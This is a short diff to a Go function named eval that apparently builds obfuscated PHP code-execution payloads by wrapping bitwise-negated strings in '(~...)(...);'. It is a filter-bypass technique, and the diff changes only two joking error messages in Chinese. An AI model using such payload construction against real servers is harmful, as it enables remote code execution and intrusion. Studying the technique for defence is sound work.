@@ -214,7 +214,7 @@ func eval(url string) {
 
 		c2, err := qufan(c2)
 		if err != nil {
-			fmt.Println("牢弟今天你代码里指定有点问题")
+			fmt.Println("牢弟你下我写的qufan.py了吗")
 		}
 
 		c3 = "~" + c2
@@ -230,7 +230,7 @@ func eval(url string) {
 
 		POC, err := qufan(c1)
 		if err != nil {
-			fmt.Println("牢弟今天你代码里指定有点问题")
+			fmt.Println("牢弟你下我写的qufan.py了吗")
 		}
 
 		c = "(~" + POC + ")(" + c3 + ");"
